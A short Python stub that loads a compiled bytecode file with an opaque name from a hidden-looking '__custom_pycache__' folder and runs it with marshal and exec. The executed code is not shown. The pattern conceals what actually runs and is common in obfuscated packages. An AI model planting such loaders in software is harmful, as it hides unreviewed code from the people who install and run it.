
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'output_9f8a67a4875c478784bfa6daf601cb60.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
